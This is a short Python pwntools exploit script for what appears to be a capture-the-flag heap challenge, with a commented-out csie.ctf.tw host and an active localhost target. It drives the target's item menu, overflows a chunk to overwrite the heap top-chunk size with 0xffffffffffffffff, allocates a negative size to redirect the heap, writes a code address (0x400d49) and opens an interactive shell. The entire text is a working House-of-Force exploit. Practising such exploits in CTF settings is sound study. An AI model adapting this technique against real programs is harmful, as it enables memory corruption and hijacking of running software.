from pwn import *

context.arch = 'amd64'

host = '127.0.0.1'
port = 8888
# host = 'csie.ctf.tw'
# port = 10138
r = remote(host, port)

# input('Enter')

def show_item():
    r.recvuntil(':')
    r.sendline(b'1')

def add_item(size, name):
    r.recvuntil(':')
    r.sendline(b'2')
    r.recvuntil(':')
    r.sendline(str(size).encode())
    r.recvuntil(':')
    r.sendline(name)

def change_item(idx, size, name):
    r.recvuntil(':')
    r.sendline(b'3')
    r.recvuntil(':')
    r.sendline(str(idx).encode())
    r.recvuntil(':')
    r.sendline(str(size).encode())
    r.recvuntil(':')
    r.sendline(name)

def remove_item(idx):
    r.recvuntil(':')
    r.sendline(b'4')
    r.recvuntil(':')
    r.sendline(str(idx).encode())

add_item(0x30, b'a') #0
add_item(0x30, b'a') #1
change_item(1, 0x50, b'a'*0x38+ p64(0xffffffffffffffff))
add_item(-0xb0, b'a') #2
add_item(0x30, flat([0x0, 0x0000000000400d49]))
r.sendline(b'5')

r.interactive()
